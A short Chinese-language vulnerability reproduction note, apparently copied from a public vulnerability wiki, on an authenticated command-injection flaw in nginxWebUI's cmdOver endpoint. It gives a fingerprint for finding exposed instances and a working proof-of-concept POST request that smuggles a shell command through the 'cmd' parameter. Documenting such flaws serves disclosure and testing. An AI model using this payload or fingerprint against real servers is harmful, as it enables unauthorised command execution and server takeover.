---
title: "nginxWebUI cmdOver 后台命令执行漏洞"
date: 2026-10-16 09:10:00
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "nginxWebUI-cmdOver"
tags:
  - "nginxWebUI-cmdOver"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

nginxWebUI 后台存在命令执行漏洞，攻击者登录后台后可以执行任意命令获取服务器权限

## 漏洞影响

```
nginxWebUI
```

## 网络测绘

```
title="nginxwebui"
```

## 漏洞复现

登录页面

![image-20220628112638269](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202206281126396.png)



验证请求包

```
POST /adminPage/remote/cmdOver

remoteId=local&cmd=start|id&interval=1
```

![image-20220628112938342](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202206281129491.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/nginxWebUI-cmdOver-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
